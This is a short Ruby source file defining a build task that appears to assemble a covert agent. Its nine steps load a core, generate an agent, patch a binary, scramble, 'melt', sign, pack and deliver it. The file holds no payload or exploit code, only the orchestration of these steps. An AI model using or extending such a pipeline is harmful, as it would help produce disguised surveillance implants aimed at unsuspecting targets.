require_relative 'generator'
require_relative '../build'

module RCS
module DB

class BuildTask
  extend TaskGenerator

  build

  def initialize(params)
    @params = params
    @builder = Build.factory(@params['platform'].to_sym)
  end
  
  def total
    9
  end
  
  def builder
    @builder
  end
  
  def next_entry
    @description = 'Loading core'
    yield @builder.load @params['factory']
    @description = 'Unpacking'
    yield @builder.unpack
    @description = 'Generating agent'
    yield @builder.generate @params['generate']
    @description = 'Patching'
    yield @builder.patch @params['binary']
    @description = 'Scrambling'
    yield @builder.scramble
    @description = 'Melting'
    yield @builder.melt @params['melt']
    @description = 'Signing'
    yield @builder.sign @params['sign']
    @description = 'Packing'
    yield @builder.pack @params['package']
    @description = 'Delivering'
    yield @builder.deliver @params['deliver']
  end
end

end # DB
end # RCS